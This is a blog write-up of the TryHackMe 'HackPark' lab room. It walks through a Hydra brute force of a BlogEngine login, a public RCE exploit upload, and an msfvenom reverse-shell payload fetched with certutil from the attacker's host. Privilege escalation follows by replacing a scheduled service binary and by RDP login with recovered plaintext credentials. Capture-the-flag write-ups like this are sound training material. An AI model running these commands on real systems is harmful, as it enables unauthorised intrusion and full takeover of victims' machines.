---
author: "Shebu"
title: "HackPark: THM"
date: "2021-11-16"
tags: ["blogengine", "autologon-credentials", "rdp", "systemscheduler", "winpeas", "tryhackme"]
cover:
    image: img/hackpark.jpg
    # can also paste direct link from external site
    # ex. https://i.ibb.co/K0HVPBd/paper-mod-profilemode.png
    alt: "<alt text>"
    caption: "<text>"
    relative: false # To use relative path for cover image, used in hugo Page-bundles
---

## Description -
_________________________________________

Bruteforce a websites login with Hydra, identify and use a public exploit then escalate your privileges on this Windows machine!

![91808b57148243.59ca95624c102.jpg](https://cdn.hashnode.com/res/hashnode/image/upload/v1632569217285/Le7ky7hva.jpeg)

|  **Room name** | HackPark                                       |
|:--------------:|------------------------------------------------|
|     **OS**     | Windows                                        |
| **Difficulty** | Medium                                         |
|  **Room Link** | https://tryhackme.com/room/hackpark            |
|   **Creator**  | [Tryhackme](https://tryhackme.com/p/tryhackme) |

## Enumeration -
__________________________________________

#### nmap

```zsh
┌──(shebu㉿kali)-[~/thm/hackpark]
└─$rustscan -a 10.10.253.78 --range 0-65535 -- -sV -sV -oN hackpark.nmap
# Nmap 7.91 scan initiated Fri Sep 24 10:37:00 2021 as: nmap -vvv -p 80,3389 -sV -sC -v -oN hackpark.nmap 10.10.30.95
Nmap scan report for 10.10.30.95
Host is up, received syn-ack (0.70s latency).
Scanned at 2021-09-24 10:37:01 EDT for 28s

PORT     STATE SERVICE            REASON  VERSION
80/tcp   open  http               syn-ack Microsoft IIS httpd 8.5
| http-methods: 
|   Supported Methods: GET HEAD OPTIONS TRACE POST
|_  Potentially risky methods: TRACE
| http-robots.txt: 6 disallowed entries 
| /Account/*.* /search /search.aspx /error404.aspx 
|_/archive /archive.aspx
|_http-server-header: Microsoft-IIS/8.5
|_http-title: hackpark | hackpark amusements
3389/tcp open  ssl/ms-wbt-server? syn-ack
| ssl-cert: Subject: commonName=hackpark
| Issuer: commonName=hackpark
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2021-09-23T14:29:32
| Not valid after:  2022-03-25T14:29:32
| MD5:   d2d4 425f 7c21 ad81 a68a dc87 3dac 86a6
| SHA-1: e48f 524a 5059 28a3 1ac9 5b85 a200 b6b4 7c4d 3ba7
| -----BEGIN CERTIFICATE-----
| MIIC1DCCAbygAwIBAgIQHkBfS+k/moVJ3+968HFmATANBgkqhkiG9w0BAQUFADAT
| MREwDwYDVQQDEwhoYWNrcGFyazAeFw0yMTA5MjMxNDI5MzJaFw0yMjAzMjUxNDI5
| MzJaMBMxETAPBgNVBAMTCGhhY2twYXJrMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A
| MIIBCgKCAQEAwuNKsVemOogwCY99oGULczMgMJIxd0iNtJKaqBFItWdTkeWsWKEy
| qeBFbXV9Y7s4O+CrYyQyyE+CxmKmR+A2/TAPgVTMwfjKsxjP0u3lVt0rJzJSp0Hf
| w5wMkesAjte6dCHOtY3kcXTzuMFbGNAmmAO8LXhQppVBoxchMdP3zcMQbw6kqkxA
| ID7HHCkIQtlsHEcgkgDZVYdL4/rn+ohTxFPcEOWeNDXMMTkjCz4BYL1rRa761Nr1
| Ydtg91V9rfCxLNNq5HwcHX8lLMnnNh6Y+BHftIjVFYeaLG7hqY4nHLd537Fk6boN
| 80lg08VY4AkxVVbWhDZ8qDyL3X8lMqdblwIDAQABoyQwIjATBgNVHSUEDDAKBggr
| BgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcNAQEFBQADggEBAISdX39FnLL9
| RyosCQvLDaj6w82nlKtCjEyEWqLMziueX/TzueeEJ00KbabgtHepW44WsE9ZyZJq
| jvGqkjYsfXdAckVZFPOHwyM3FpxF6lhGaYVVdMiZrBdMfvOMTNHXpyK9uG8g5Dun
| BPk+1z/25lO9DEOdFRHFHagbC2mf9shwWt9dDIUfVNBg5sFYFNNUo+WNJxsDVEP6
| 8C3Oi1E6Bpj7LGUrodc0kdIbVdgh+VXJW1OJEiLK/G208feHIyYvG7Mh9Jgk6g6q
| /hWv/T3d/fjelncL12dKIU/NodsLQ4uqknZolHfCXbIE7ME5i0HEVTJ3cL3Fh8PX
| 1g871ab1pXY=
|_-----END CERTIFICATE-----
|_ssl-date: 2021-09-24T14:36:21+00:00; -1m06s from scanner time.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -1m06s

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Sep 24 10:37:29 2021 -- 1 IP address (1 host up) scanned in 28.75 seconds

```

There are 2 ports open :

**Port 80**: `http ` - ` Microsoft IIS httpd 8.5 `

**Port 3389**: `RDP` -  `Microsoft WBT Server`

#### Web enumeration
______________________________

Visiting the website at port 80 gives us this page 

![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1632576856724/73cbUHHWa.png)

As per our map scan there are few disallowed entries in robots.txt,let's check it out

![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1632576996167/oWGD336ug.png)

All of them returned 403 but `/archive` gave us this page but it didn't contain any interesting stuff

![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1632577092768/oTJoyxzaA.png)

The options tab in the home page we visited earlier had a login option, 

![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1632577162449/_oEkcO8Ai.png)
Let's check it out 

![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1632577240563/DHfSghYs2.png)
#### Hydra 
_____________________________________________

I tried all default usernames and passwords but nothing worked,so I decided to bruteforce the login form using **hydra**

![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1632577327616/rnhg3xQxl.png)

And it worked, now we have a username and password .Let's log in !

![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1632577649505/ymyOTawPM.png)

## Foothold -
____________________________________
The **About** section tells us the version of the `BlogEngine` being used here is `3.3.6.0`

![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1632589633280/l69fE2UQt.png)

Looking for exploits for this particular version in searchsploit reveals this,

![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1632577792556/o0Od4tB2-.png)

There are 3 RCE exploits , lets try the first one. Before that we'll mirror the exploit and examine it: `searchsploit -m aspx/webapps/46353.cs `

The exploit tells us the steps we need to do inorder to gain a reverse shell back to our machine.

![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1632578000079/iZPy6iGO5.png)

Here's what we need to do
```zsh
1.Rename the exploit as "PostView.ascx"
2.Change the IP and port in the exploit .
3.Log in to the application as admin.
4.Click Contents->Posts->Welcome to Hackpark title->File Manager
5.Click on UPLOAD
Upload the PostView.ascx and save it
6.Setup nc listener and visit http://<ip>/?theme=../../App_Data/files
7.The web page keeps on loading which means you've got a rev-shell back !
``` 

![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1632578661936/vR_ukso02.png)

The shell is not stable so let's create a msfvenom payload and upload it to the machine  👇🏻

1.On our machine 
-> `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.30.219 LPORT=4444 -f exe > shell.exe`

2.On victim machine, go to `C:\Users\Public` which is usually world writable directory and grab the msfvenom payload from our machine 

-> `certutil.exe  -urlcache  -f  http://10.11.30.219:8000/shell.exe shell.exe`

![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1632579225735/TXTV_37TU.png)

3.Execute `shell.exe` to get back a stable shell in msf .

![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1632579262972/kzgeaWJy_.png)

## Privilege Escalation -
___________________________

Running **sysinfo** tells us that we are on a 64-bit machine.

![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1632579373274/FkXwERmRs.png)

There are 2 users on the system: `jeff` and `administrator`

![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1632579449798/TJtYNuvis.png)

I quickly transferred `winpeas` to the target machine and ran it

![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1632579620979/qkGVKtlTV.png)

There were 2 way to priv-esc as admin user

#### Method 1: 

Running winpeas tells us that we have permissions to modify the following system-scheduler service binary

![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1632580309744/Aa1-bR5Gw.png)

`C:\Program Files (x86)\SystemScheduler` - contains all the executables run by the scheduler.But we need to know which .exe is being executed by the systemscheduler.

>NOTE: Scheduler is similar to something like cron in Linux

So lets check the `Events` directory inside the SystemScheduler folder which contains the systemlog files.
The **20198415519.INI_LOG.txt** file contains the info we need! From the contents of the log file we could understand that  the  `Message.exe` **is being run by administrator every 30 seconds**.

To exploit this  just follow the steps ,

1.Rename `Message.exe` to `Message.bak`

2.Move `shell.exe` which we previously used to gain a stable shell to this current directory `C:\Program Files (x86)\SystemScheduler`

3.Rename shell.exe to Message.exe.

4.**Setup a netcat listener on our local machine and wait for 30 seconds to get a shell back as administrator !**

#### Method 2 -

Winpeas output gave us these credentials 👇🏻

![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1632583429899/ugC7-P3dz.png)
Remember ? We had port 3389 open which is RDP.

Let's try logging in using xfreerdp 
- `xfreerdp /u:administrator /v:10.10.176.92:3389 /cert:ignore /p:4q6XvFES7Fdxs `

Aaandd we're in !

![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1632583779267/Z29rNAPJz.png)

 
Grab the `user.txt` 🚩
- Open command prompt, navigate  `C:\Users\jeff\Desktop` and grab the user flag
![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1632588958789/q8t-bRsxA.png)

Grab `root.txt` 🚩
- root.txt file is on the Desktop of admin user .

![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1632589030217/5ExrAwXGR.png)
